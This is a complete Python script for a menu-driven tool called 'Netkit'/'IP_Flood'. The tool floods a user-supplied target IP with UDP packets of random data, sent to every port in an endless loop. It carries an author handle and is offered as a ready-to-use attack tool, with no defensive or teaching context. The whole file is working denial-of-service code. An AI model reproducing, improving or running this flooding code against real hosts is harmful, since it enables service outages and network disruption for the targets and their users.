import os
import subprocess
import socket
import random
import time

def ip_flood_attack():
    # Create a UDP socket
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Generate 3500 bytes of random data to be sent in each packet
    packet_data = random._urandom(3500)
    # Prompt the user to enter the target IP address
    ip = input("[+] Target's IP: ")
    try:
        # Convert the IP address to a valid format
        target_ip = socket.gethostbyname(ip)
    except socket.gaierror:
        print("[ERROR] Invalid IP address or host not found.")
        return
    
    # Clear the screen
    os.system("clear")
    # Print a message indicating that the attack is starting
    print(f"Attack starting on {target_ip}...")
    
    while True:  # Continuous packet sending loop
        # Send packets to every port on the target IP address
        for port in range(1, 65535):
            # Send a packet to the target IP address and port
            udp_socket.sendto(packet_data, (target_ip, port))
            # Print a message indicating the number of packets sent, the target IP address, and the port number
            print(f"Sent packet to {target_ip}:{port}")
        time.sleep(3)  # Sleep for a few seconds before sending packets again

def main():
    os.system("clear")
    os.system("figlet Netkit | lolcat")
    
    message = "    white_devil_0420"
    # Use subprocess to execute the echo command and pipe the message to lolcat
    p1 = subprocess.Popen(['echo', '-n', message], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(['lolcat'], stdin=p1.stdout, stdout=subprocess.PIPE)
    # Decode the output and print it
    output = p2.communicate()[0].decode('utf-8')
    print(output)

    message = """\033[33m
        
        1. Start IP flood attack on an IP
        2. Exit from the tool
        █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        \033[0m
        """
    print(message)
    
    while True:  # Infinite loop until user decides to exit
        try:
            choice = int(input("\033[1m\033[33;32m[+] What do you want to do? Enter option: \033[0m"))
            if choice == 1:
                ip_flood_attack()
            elif choice == 2:
                print("white_devil_0420")
                print("Exiting...")
                print("Thank you for using IP_Flood...")
                print("@white_devil_0420 on Telegram")
                break  # Exit the loop and the program
            else:
                print("\033[31m[ERROR!] Invalid input. Please try again...\033[0m")
        except ValueError:
            print("\033[31m[ERROR!] Invalid input. Please enter a number.\033[0m")

if __name__ == '__main__':
    main()

